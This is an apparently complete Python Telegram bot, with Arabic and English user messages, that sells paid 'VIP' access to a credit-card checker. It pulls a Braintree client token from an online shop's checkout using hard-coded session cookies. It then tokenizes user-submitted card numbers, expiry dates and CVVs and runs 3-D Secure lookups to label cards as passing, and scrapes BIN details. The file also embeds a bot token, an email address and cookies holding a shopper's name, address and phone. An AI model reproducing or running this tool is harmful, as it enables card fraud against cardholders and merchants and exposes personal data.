from pytz import timezone
from apscheduler.schedulers.background import BackgroundScheduler
from datetime import datetime, timedelta
import telebot
import requests
from telebot import types
from bs4 import BeautifulSoup
import pycountry
import uuid
import time
from faker import Faker
import random
import os
import string
import re
import base64
import json
from user_agent import generate_user_agent
import urllib.request
faker = Faker()
fake = Faker()
token = '7582378932:AAEISLWk0YOUJCD2cfGd05zW_8O_bZHM43s'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = ['7069250607']
users = {}
vip_keys = {}
vip_users = {}
vip_expirations = {}
ban_list = set()
channel_id = "@SSAAV13"

@bot.message_handler(commands=["start"])
def start(message):
    user_id = str(message.from_user.id)
    try:
        nm = message.from_user.first_name or ""
    except:
        nm = ""   
    if user_id in admin:
        req = requests.get(f'https://api.telegram.org/bot7582378932:AAEISLWk0YOUJCD2cfGd05zW_8O_bZHM43s/getChatMember?chat_id={channel_id}&user_id={user_id}').json()
        
        if req['ok'] and req['result']['status'] in ['member', 'administrator', 'creator']:
            if user_id not in users:
                users[user_id] = {"attempts": 50, "last_attempt": datetime.now().date()}
                
            ttgg = """
مرحبا أيها الأدمن
دعني أريك ما يمكنك فعله
(لاضافه عضو الى VIP )
/generate_vip - عدد الايام - اليوزر

/ban - لحظر عضو
/unban - لإلغاء حظر عضو
/all - لإرسال رسالة لجميع المستخدمين
/cmds - لعرض الخيارات
/info - لعرض المعلومات
            """
            bot.reply_to(message, f"<strong>{ttgg}</strong>")
        else:
            ch = channel_id.split('@')[1]
            tlg = f"""
🚸| عذرا عزيزي
🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه

- https://t.me/{ch}

‼️| اشترك ثم قم بالدخول إلى البوت
            """
            bot.send_message(message.chat.id, f"<strong>{tlg}</strong>", parse_mode="html", reply_markup=types.InlineKeyboardMarkup())
    else:
        
        req = requests.get(f'https://api.telegram.org/bot7582378932:AAEISLWk0YOUJCD2cfGd05zW_8O_bZHM43s/getChatMember?chat_id={channel_id}&user_id={user_id}').json()
        if req['ok'] and req['result']['status'] in ['member', 'administrator', 'creator']:
            if user_id not in users:
                users[user_id] = {"attempts": 50, "last_attempt": datetime.now().date()}
            but2 = types.InlineKeyboardButton(text='- ⚜️𝐀𝐛𝐨𝐮𝐭 ', callback_data='abo')
            A = types.InlineKeyboardButton(text="𝐏𝐥𝐚𝐧 𝐕𝐈𝐏💱 ", callback_data='Dev')
            ttgg = f"""
مرحبا بك عزيزي {nm} 🔮
أنا بوت أقوم بفحص البطاقات الائتمانية. من فضلك دعني أساعدك.
قم بإرسال الأمر التالي لعرض الخدمات:
/cmds
لعرض معلوماتك 
/info
            """
            maac = types.InlineKeyboardMarkup()
            maac.row_width = 2
            maac.add(A, but2)            
            bot.reply_to(message, f"<strong>{ttgg}</strong>", parse_mode="html", reply_markup=maac)
        else:
            ch = channel_id.split('@')[1]
            tlg = f"""
🚸| عذرا عزيزي
🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه

- https://t.me/{ch}

‼️| اشترك ثم قم بالدخول إلى البوت
            """
            bot.send_message(message.chat.id, f"<strong>{tlg}</strong>", parse_mode="html", reply_markup=types.InlineKeyboardMarkup())


@bot.callback_query_handler(func=lambda call: True)
def st(call):
    if call.data == "abo":
        mh = """
مميزات ال Free:
يستخدم جميع البوبات لكن 50 محاوله في اليوم
مميزات ال VIP يستخدم جميع البوابات بدون حدود.!
        """
        bot.send_message(call.message.chat.id, f"<strong>{mh}</strong>", parse_mode="html", reply_markup=types.InlineKeyboardMarkup())
    elif call.data == "Dev":
        kii = """
مرحبا بك عزيزي:
اذا كنت تود الاشتراك بالبوت واستخدام جميع المميزات دون توقف
ما عليك سوا قراءه الاسعار:
If You Want To Become VIP And Use All Tools WithOut Stoped:
DAY : 2.5$ USDT
2 DAY : 4 $ USDT
WEEKE : 10$ USDT
MOUTH : 30$ USDT
ALL THE SOURCE PRICE : 500$ USDT OPEN SOURCE
OWNER : @IV2VV
Admins : @IV2VV OR @IV2VV
        """
        bot.send_message(call.message.chat.id, f"<strong>{kii}</strong>", parse_mode="html", reply_markup=types.InlineKeyboardMarkup())
        
        
        

@bot.message_handler(commands=["generate_vip"])
def generate_vip_key(message):
    user_id = str(message.from_user.id)
    if user_id in admin:
        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, "استخدام: /generate_vip <user_id> <عدد الأيام>")
            return
        try:
            target_user_id = str(args[1])
            duration_days = int(args[2])
        except:
            bot.reply_to(message, "تأكد من أن معرف المستخدم وعدد الأيام أرقام صحيحة.")
            return
        
        if target_user_id in users:
            vip_key = "mahos-" + uuid.uuid4().hex.upper()
            vip_keys[vip_key] = target_user_id
            expiration_date = datetime.now() + timedelta(days=duration_days)
            vip_expirations[target_user_id] = expiration_date

            bot.reply_to(message, f"مفتاح VIP للمستخدم {target_user_id}:\n\n/use_vip {vip_key}\n\nالصلاحية تنتهي في {expiration_date}")
            bot.send_message(target_user_id, f"تم منحك مفتاح VIP لمدة {duration_days} أيام. الصلاحية تنتهي في {expiration_date}.")
        else:
            bot.reply_to(message, "المستخدم غير موجود.")
    else:
        bot.reply_to(message, "أنت لست مديراً.")

def check_expirations():
    now = datetime.now()
    expired_users = [user_id for user_id, exp_date in vip_expirations.items() if exp_date < now]
    for user_id in expired_users:
        del vip_expirations[user_id]
        if user_id in vip_users:
            del vip_users[user_id]
        users[user_id]["attempts"] = 50
        users[user_id]["last_attempt"] = datetime.now().date()

scheduler = BackgroundScheduler(timezone=timezone('Asia/Aden'))
scheduler.add_job(check_expirations, 'interval', minutes=1)
scheduler.start()

@bot.message_handler(commands=["use_vip"])
def use_vip(message):
    user_id = str(message.from_user.id)
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "استخدام: /use_vip <vip_key>")
        return
    vip_key = args[1]
    if vip_key in vip_keys and vip_keys[vip_key] == user_id:
        vip_users[user_id] = datetime.now() + timedelta(days=1)
        del vip_keys[vip_key]
        bot.reply_to(message, "تم تفعيل VIP بنجاح.")
        bot.send_message(user_id, f"تم تفعيل البوت بنجاح. الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    else:
        bot.reply_to(message, "مفتاح VIP غير صالح أو مستخدم.")

@bot.message_handler(commands=["unsubscribe"])
def unsubscribe(message):
    user_id = str(message.from_user.id)
    if user_id in vip_users:
        del vip_users[user_id]
        if user_id in vip_expirations:
            del vip_expirations[user_id]
        users[user_id]["attempts"] = 50
        users[user_id]["last_attempt"] = datetime.now().date()
        bot.reply_to(message, "تم إلغاء اشتراك VIP الخاص بك.")
    else:
        bot.reply_to(message, "أنت لست مشتركاً في VIP.")

@bot.message_handler(commands=["all"])
def broadcast(message):
    user_id = str(message.from_user.id)
    if user_id in admin:
        args = message.text.split(maxsplit=1)
        if len(args) != 2:
            bot.reply_to(message, "استخدام: /all <message>")
            return
        msg = args[1]
        for user in users:
            bot.send_message(user, msg)
    else:
        bot.reply_to(message, "أنت لست مديراً.")

@bot.message_handler(commands=["ban"])
def ban_user(message):
    user_id = str(message.from_user.id)
    if user_id in admin:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "استخدام: /ban <user_id>")
            return
        banned_user_id = str(args[1])
        ban_list.add(banned_user_id)
        bot.reply_to(message, f"تم حظر المستخدم {banned_user_id}.")
    else:
        bot.reply_to(message, "أنت لست مديراً.")

@bot.message_handler(commands=["unban"])
def unban_user(message):
    user_id = str(message.from_user.id)
    if user_id in admin:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "استخدام: /unban <user_id>")
            return
        unbanned_user_id = str(args[1])
        if unbanned_user_id in ban_list:
            ban_list.remove(unbanned_user_id)
            bot.reply_to(message, f"تم رفع الحظر عن المستخدم {unbanned_user_id}.")
        else:
            bot.reply_to(message, "المستخدم غير محظور.")
    else:
        bot.reply_to(message, "أنت لست مديراً.")

@bot.message_handler(commands=['info'])
def inf(message):
    try:
        nm = message.from_user.first_name or "غير معروف"
    except:
        nm = "غير معروف"

    try:
        user_id = message.from_user.id
    except:
        user_id = ""

    try:
        username = message.from_user.username or "غير متوفر"
    except:
        username = "IV2VV"

    try:
        bio = bot.get_chat(user_id).bio or ""
    except:
        bio = ""

    user_type = "VIP" if str(user_id) in vip_users else "Free"

    try:
        if '@' in username:
            username = username.split('@')[1]
        api_tele = requests.get(f'https://t.me/{username}')
        soup = BeautifulSoup(api_tele.content, 'html.parser')
        profile_pic_url = soup.find('meta', property='og:image')['content']
        profile_pic_path = f"{username}.jpg"
        urllib.request.urlretrieve(profile_pic_url, profile_pic_path)

        msg = f"""
═══════𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖═════════
- 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 ⇾ @{username}
- 𝐍𝐚𝐦𝐞 ⇾ {nm}
- 𝐁𝐢𝐨 ⇾ {bio}
- 𝐂𝐮𝐬𝐭𝐨𝐦𝐞𝐫: {user_type}
══════𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖═════════
        """

        with open(profile_pic_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption=msg, parse_mode='html')
        os.remove(profile_pic_path)
    except Exception as e:
        bot.reply_to(message, f"<strong>{msg}</strong>")    







def GITVPB():
    try:
        cookies = {
    'isVisitorNew': 'true',
    'UUID': '5711c13-3245-2dbc-cc41-d5bbab1cc826',
    'regional-preference-url': '%7B%22value%22%3A%22https%3A%2F%2Fus.elemis.com%22%7D',
    'lagrange_session': '65a8475e-d4a2-4830-919d-d931f0296c6f',
    'wcid': '/0EXRIgf4BfKAAAB',
    'PHPSESSID': '514decb255d7a59aa4db62f6b0635e37',
    'og_session_id': '8d6d51c346324b4fa57fd3ae3824b42d.68084.1734348229',
    'returningVisitor': '2',
    '_gcl_au': '1.1.524109134.1734348236',
    '_ga': 'GA1.1.1624005797.1734348231',
    'gtmNamespaceDeclared': 'true',
    '_pin_unauth': 'dWlkPU1qbGxObU5tWkRZdFlXRmpaaTAwWldFNUxXRXhaVFV0TWpZek1XVmlPREJrT0dWaQ',
    '__attentive_id': 'ed01e51ac2b54b438b9b30566c511707',
    '_attn_': 'eyJ1Ijoie1wiY29cIjoxNzM0MzQ4MjQ1MjcxLFwidW9cIjoxNzM0MzQ4MjQ1MjcxLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImVkMDFlNTFhYzJiNTRiNDM4YjliMzA1NjZjNTExNzA3XCJ9In0=',
    '__attentive_cco': '1734348245295',
    'cto_bundle': 'iGvbC19yVlF3bzVlZ0UxdnlZVGp5Y1pZRmVYT1hUdHJpVHhuZDljUHJTek5WVVp3YUNBa2JZZ2xFVGZiUWlEcmIlMkJCRVZNSlpIcjhERlBndGRRY3lwdDMlMkZ5emMlMkJwSldLMiUyQjRwb3VyJTJCOEhibyUyRm5hdVU4bVo0R3ZETEpIYXBrNWlUQ3pqeTEwJTJGYmNoakJkbVlnZUNnc1BVOWhsZyUzRCUzRA',
    '_cs_c': '0',
    '_tt_enable_cookie': '1',
    '_ttp': 'vyBDi7QwtCky-gorvRKCgPAtahB.tt.1',
    '_fbp': 'fb.1.1734348247849.95431479509303623',
    'GSIDUrNuC2c0oQie': '6886ee46-045c-4c22-ab69-b377e0108d97',
    'STSID555606': '5a657f5b-8464-4564-9e88-f0b1a2e820ca',
    '__attentive_utm_loggedIn': 'false',
    '__attentive_ss_referrer': 'ORGANIC',
    '__attentive_dv': '1',
    'ltkSubscriber-Newsletter': 'eyJsdGtDaGFubmVsIjoiZW1haWwiLCJsdGtUcmlnZ2VyIjoibG9hZCIsImx0a0VtYWlsIjoiIiwibHRrT3B0SW4iOiJvZmYifQ%3D%3D',
    '_vuid': '1a2844c0-81cc-4744-a618-5ff489a8ef2d',
    '_cs_id': '56f46460-f06a-a11f-f2e3-b481bf9024e5.1734348248.1.1734348270.1734348248.1724143178.1768512248115.1',
    '_cs_s': '6.0.0.9.1734350079976',
    'attntv_mstore_email': 'n.sakeer.j@gmail.com:0',
    'ltkSubscriber-AccountCreate': 'eyJsdGtDaGFubmVsIjoiZW1haWwiLCJsdGtUcmlnZ2VyIjoibG9hZCIsImx0a0VtYWlsIjoiIiwiRmlyc3ROYW1lIjoiQWxpIiwiTGFzdE5hbWUiOiJSZXN3aWwifQ%3D%3D',
    'ltkSubscriber-CheckoutUS': 'eyJsdGtDaGFubmVsIjoiZW1haWwiLCJsdGtUcmlnZ2VyIjoiY2hlY2tvdXQiLCJsdGtTYXZlZCI6dHJ1ZSwibHRrRW1haWwiOiJuLnNha2Vlci5qQGdtYWlsLmNvbSIsIkZpcnN0TmFtZSI6IkFsaSIsIkxhc3ROYW1lIjoiUmVzd2lsIiwiQWRkcmVzcyI6IjIxOSBOZXcgWW9yayIsIkFkZHJlc3MyIjoiIiwiQ291bnRyeSI6IlVuaXRlZCBTdGF0ZXMiLCJDaXR5IjoiTmV3IFlvcmsiLCJaaXAiOiIxMDA4MCIsIlBob25lIjoiKDIwOSkgNjMyLTI1NTgifQ%3D%3D',
    '_uetsid': '4038c090bba011ef85aebf2e9ec82fe7',
    '_uetvid': '403988c0bba011efb9afa109d9634cb7',
    '__attentive_pv': '3',
    'sa-user-id': 's%253A0-91088198-a7f1-44f9-75ee-b0cfd9660001.ruHBIv09rvIFA6r7Lv5BpoWmCaB4zW6ywBR4BeAw32A',
    'sa-user-id-v2': 's%253AkQiBmKfxRPl17rDP2WYAAS1MxtQ.3UnxaN07MR6Uz4uuwBztIdb5fLdoVE8HMgSbikRjqQ8',
    'sa-user-id-v3': 's%253AAQAKIHUbbvaI043ui2e7UzusDJUnzk-u7VYUyiAoqheEKRglEKAEGAIg46rfugY6BC27IaxCBGGCCGA.nC8LhJPupSyq2FdjGrKOrsk8Yh8vrE6jFFXMpUXgC0U',
    'ltkpopup-session-depth': '2-19',
    'private_content_version': '91d53c5e797909c8efbec153da79f71f',
    'ABTastySession': 'mrasn=&lp=https%253A%252F%252Fus.elemis.com%252F',
    'datadome': 'fnlBRP9XPhvE7Gt~o0nzRTegHD91pkHkjIhuFFAmA56oxtHMgjeT14RfmoBy24s8lhyVKLR70aZWvJ92NSj8ugCHTrnR2hKFtd7V6wqDIahH2qcSmh8Zc~gSdVsOzjWh',
    'ABTasty': 'uid=jvf33shp46gevv2h&fst=1734348228554&pst=-1&cst=1734348228554&ns=1&pvt=8&pvis=8&th=1336627.1656621.1.1.1.1.1734348234771.1734348234771.0.1_1339835.1660712.2.2.1.1.1734348230654.1734348234812.0.1_1355832.1680220.2.2.1.1.1734348230697.1734348234659.0.1',
    '_ga_GZKSYFV883': 'GS1.1.1734348230.1.1.1734348400.60.0.0',
    'OptanonConsent': 'isGpcEnabled=0&datestamp=Mon+Dec+16+2024+14%3A26%3A40+GMT%2B0300+(%D8%A7%D9%84%D8%AA%D9%88%D9%82%D9%8A%D8%AA+%D8%A7%D9%84%D8%B9%D8%B1%D8%A8%D9%8A+%D8%A7%D9%84%D8%B1%D8%B3%D9%85%D9%8A)&version=202409.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=1a06fde4-c14b-493c-9f95-eb305bd87925&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CSPD_BG%3A1%2CC0005%3A1%2CC0002%3A1%2CC0004%3A1&AwaitingReconsent=false',
}

        headers = {
    'authority': 'us.elemis.com',
    'accept': '*/*',
    'accept-language': 'ar-TN,ar-EG;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6',
    'authorization': '',
    'content-currency': 'USD',
    'content-type': 'application/json',
    'origin': 'https://us.elemis.com',
    'referer': 'https://us.elemis.com/checkout',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'store': 'us',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

        json_data = {
            'operationName': None,
            'variables': {},
            'query': 'mutation{createBraintreeClientToken}',
        }

        res = requests.post('https://us.elemis.com/graphql', cookies=cookies, headers=headers, json=json_data)
        key = res.json()["data"]["createBraintreeClientToken"]
        dec = base64.b64decode(key)
        clint = dec.decode('utf-8')
        Auth = json.loads(clint)
        fixed = Auth['authorizationFingerprint']
        
        try:
            os.remove('VPV.txt')
        except:
            pass

        with open('VPV.txt', 'a') as t:
            t.write(f"{fixed}\n")

    except Exception as e:
        print(e)
        GITVPB()


def check_VPV(message, user_type):
    kg = bot.reply_to(message, '<strong>[~] Processing Your request 10 Second Please... </strong>', parse_mode="HTML")
    time.sleep(10)
    if '.vbv' in message.text:
        P = message.text.split('.vbv')[1].strip()
    elif '/vbv' in message.text:
        P = message.text.split('/vbv')[1].strip()

    n, mm, yy, cvc = map(str.strip, P.split("|"))
    if not yy.startswith('20'):
        yy = '20' + yy

    try:
        start_time = time.time()

        try:
            with open("VPV.txt", "r") as f:
                Auth = f.read().strip()
        except:
            GITVPB()
            with open("VPV.txt", "r") as f:
                Auth = f.read().strip()

        hd = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-TN,ar-EG;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6',
    'authorization': f'Bearer {Auth}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

        da = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': '2761a6cf-811a-459b-b79e-c378d11074b5',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

        req = requests.post('https://payments.braintree-api.com/graphql', headers=hd, json=da)
        tok = req.json()['data']['tokenizeCreditCard']['token']

        headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-TN,ar-EG;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6',
    'content-type': 'application/json',
    'origin': 'https://us.elemis.com',
    'referer': 'https://us.elemis.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

        json_data = {
    'amount': 67.5,
    'additionalInfo': {
        'acsWindowSize': '03',
        'billingLine1': ' ',
        'billingCity': '',
        'billingPostalCode': '',
        'billingCountryCode': 'UK',
        'billingPhoneNumber': '',
        'billingGivenName': '',
        'billingSurname': '',
        'email': 'n.sakeer.j222211@gmail.com',
    },
    'challengeRequested': True,
    'bin': n[:6],
    'dfReferenceId': '0_09794ea6-e5fb-4113-805f-a556992c8b04',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.58.0',
        'cardinalDeviceDataCollectionTimeElapsed': 5457,
        'issuerDeviceDataCollectionTimeElapsed': 14339,
        'issuerDeviceDataCollectionResult': False,
    },
    'authorizationFingerprint': Auth,
    'braintreeLibraryVersion': 'braintree/web/3.58.0',
    '_meta': {
        'merchantAppId': 'us.elemis.com',
        'platform': 'web',
        'sdkVersion': '3.58.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '2761a6cf-811a-459b-b79e-c378d11074b5',
    },
}

        response = requests.post(
            f'https://api.braintreegateway.com/merchants/24bgzphxpz9nrhbw/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
            headers=headers,
            json=json_data,
        )
        if 'authenticate_attempt_successful' in response.text:
            stay = '𝐏𝐚𝐬𝐬𝐞𝐝✅'
            try:
                AH = response.json()['paymentMethod']['threeDSecureInfo']['status']
            except:
                AH = ""
        elif 'challenge_required' in response.text:
            stay = '𝐜𝐡𝐚𝐥𝐥𝐞𝐧𝐠𝐞❌'
            try:
                AH = response.json()['paymentMethod']['threeDSecureInfo']['status']
            except:
                AH = ""
        elif 'lookup_card_error' in response.text:
            stay = '𝐄𝐫𝐨𝐫𝐫🔺'
            try:
                AH = response.json()['paymentMethod']['threeDSecureInfo']['status']
            except:
                AH = ""
        elif 'authentication' in response.text:
            stay = '𝐍𝐨𝐧𝐞🔎'
            try:
                AH = response.json()['paymentMethod']['threeDSecureInfo']['status']
            except:
                AH = ""
        elif 'Authorization fingerprint has an invalid format' in response.text or 'Authorization fingerprint is invalid' in response.text:
        	stay = '𝐍𝐨𝐧𝐞🔎'
        	AH = 'Try again'
        	GITVPB()
        else:
            try:
                stay = ""
                AH = response.json()['paymentMethod']['threeDSecureInfo']['status']
            except:
                AH = ""
                GITVPB()

        try:
            meet_headers = {
                'Referer': 'https://bincheck.io/ar',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            }
            response = requests.get(f'https://bincheck.io/ar/details/{P[:6]}', headers=meet_headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            table1 = soup.find('table', class_='w-full table-auto')
            rows1 = table1.find_all('tr')
            table2 = soup.find_all('table', class_='w-full table-auto')[1]
            rows2 = table2.find_all('tr')

            bin_, brand, card_type, card_level, bank, bank_phone = "", "", "", "", "", ""
            for row in rows1:
                cells = row.find_all('td')
                if len(cells) == 2:
                    cell1_text = cells[0].text.strip()
                    cell2_text = cells[1].text.strip()
                    if cell1_text == 'BIN/IIN':
                        bin_ = cell2_text
                    elif cell1_text == 'العلامة التجارية للبطاقة':
                        brand = cell2_text
                    elif cell1_text == 'نوع البطاقة':
                        card_type = cell2_text
                    elif cell1_text == 'تصنيف البطاقة':
                        card_level = cell2_text
                    elif cell1_text == 'اسم المصدر / البنك':
                        bank = cell2_text
                    elif cell1_text == 'المُصدِر / هاتف البنك':
                        bank_phone = cell2_text

            country_name, country_iso_a2, country_iso_a3, country_flag, currency = "", "", "", "", ""
            for row in rows2:
                cells = row.find_all('td')
                if len(cells) == 2:
                    cell1_text = cells[0].text.strip()
                    cell2_text = cells[1].text.strip()
                    if cell1_text == 'اسم الدولة ISO':
                        country_name = cell2_text
                    elif cell1_text == 'رمز البلد ISO A2':
                        country_iso_a2 = cell2_text
                    elif cell1_text == 'ISO كود الدولة A3':
                        country_iso_a3 = cell2_text
                    elif cell1_text == 'علم الدولة':
                        country_flag = cells[1].find('img')['src']
                    elif cell1_text == 'عملة البلد ISO':
                        currency = cell2_text

            try:
                country = pycountry.countries.get(name=country_name)
                flag = country.flag if country else ""
            except:
                
                flag = ""

            end_time = time.time()
            duration = int(end_time - start_time)

            msg = f"""
𝐕𝐁𝐕⇾ 🔰
𝐂𝐚𝐫𝐝 ⇾ {P}
𝐌𝐚𝐬𝐬𝐚𝐠𝐞 ⇾ {AH}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾ {stay}
━━━━━━━━━━━━━━━━━
- 𝗕𝗜𝗡 ⇾ {P[:6]}
- 𝗜𝗻𝗳𝗼 ⇾ {card_type} - {brand} - {card_level}
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country_name} {flag}
- 𝐏𝐇𝐎𝐍𝐄 ⇾ {bank_phone}
- 𝐎𝐓𝐇𝐄𝐑 ⇾ {currency} - {country_iso_a2} - {country_iso_a3}
- 𝐓𝐢𝐦𝐞⇾ {duration}s
- 𝐂𝐮𝐬𝐭𝐨𝐦𝐞𝐫: {user_type}
━━━━━━━━━━━━━━━━━
◆ 𝐁𝐘: @IV2VV
"""
            bot.delete_message(message.chat.id, kg.message_id)
            bot.reply_to(message, msg)
        except Exception as e:
            bot.reply_to(message, f"𝙐𝙣𝙡𝙤𝙤𝙠 𝘽𝙄𝙉 𝙏𝙧𝙮 𝙖𝙣𝙤𝙩𝙝𝙚𝙧🔎")    
    except Exception as e:
        bot.reply_to(message, f"𝙏𝙧𝙮 𝙖𝙣𝙤𝙩𝙝𝙚𝙧🔎")
        GITVPB()
def process_bin(message, user_type):
    try:
        kg=bot.reply_to(message,f'<strong>[~] Processing Your request... </strong>',parse_mode="HTML")
        time.sleep(1)
        if '.bin' in message.text:
            P = message.text.split('.bin')[1].strip()
        elif '/bin' in message.text:
            P = message.text.split('/bin')[1].strip()

        start_time = time.time()

        meet_headers = {
            'Referer': 'https://bincheck.io/ar',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        }

        response = requests.get(f'https://bincheck.io/ar/details/{P[:6]}', headers=meet_headers)
        soup = BeautifulSoup(response.text, 'html.parser')

        table1 = soup.find('table', class_='w-full table-auto')
        rows1 = table1.find_all('tr')

        table2 = soup.find_all('table', class_='w-full table-auto')[1]
        rows2 = table2.find_all('tr')

        for row in rows1:
            cells = row.find_all('td')
            if len(cells) == 2:
                cell1_text = cells[0].text.strip()
                cell2_text = cells[1].text.strip()
                if cell1_text == 'BIN/IIN':
                    bin_ = cell2_text
                elif cell1_text == 'العلامة التجارية للبطاقة':
                    brand = cell2_text
                elif cell1_text == 'نوع البطاقة':
                    card_type = cell2_text
                elif cell1_text == 'تصنيف البطاقة':
                    card_level = cell2_text
                elif cell1_text == 'اسم المصدر / البنك':
                    bank = cell2_text
                elif cell1_text == 'المُصدِر / هاتف البنك':
                    bank_phone = cell2_text

        for row in rows2:
            cells = row.find_all('td')
            if len(cells) == 2:
                cell1_text = cells[0].text.strip()
                cell2_text = cells[1].text.strip()
                if cell1_text == 'اسم الدولة ISO':
                    country_name = cells[1].text.strip()
                elif cell1_text == 'رمز البلد ISO A2':
                    country_iso_a2 = cell2_text
                elif cell1_text == 'ISO كود الدولة A3':
                    country_iso_a3 = cell2_text
                elif cell1_text == 'علم الدولة':
                    country_flag = cells[1].find('img')['src']
                elif cell1_text == 'عملة البلد ISO':
                    currency = cell2_text

        try:
            country = pycountry.countries.get(name=country_name)
            flag = country.flag if country else ""
        except:
            flag = ""

        end_time = time.time()
        duration = int(end_time - start_time)

        msg = f"""
𝐁𝐈𝐍 𝐋𝐎𝐎𝐊 𝐔𝐏 🔎    
━━━━━━━━━━━━━━━━━
- 𝗕𝗜𝗡 ⇾ {P[:6]} 
- 𝗜𝗻𝗳𝗼 ⇾ {card_type} - {brand} - {card_level}
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country_name} {flag}
- 𝐏𝐇𝐎𝐍𝐄 ⇾ {bank_phone}
- 𝐎𝐓𝐇𝐄𝐑 ⇾ {currency} - {country_iso_a2} - {country_iso_a3}
- 𝐓𝐢𝐦𝐞⇾ {duration}s
- 𝐂𝐮𝐬𝐭𝐨𝐦𝐞𝐫 ⇾ {user_type}
━━━━━━━━━━━━━━━━━
◆ 𝐁𝐘: @IV2VV
"""
        bot.delete_message(message.chat.id, kg.message_id)
        bot.reply_to(message, msg)
    except:
        bot.reply_to(message, f"𝙐𝙣𝙡𝙤𝙤𝙠 𝘽𝙄𝙉 𝙏𝙧𝙮 𝙖𝙣𝙤𝙩𝙝𝙚𝙧🔎")

while True:
    try:
        bot.infinity_polling()
    except Exception as e:
        print(e)
        pass
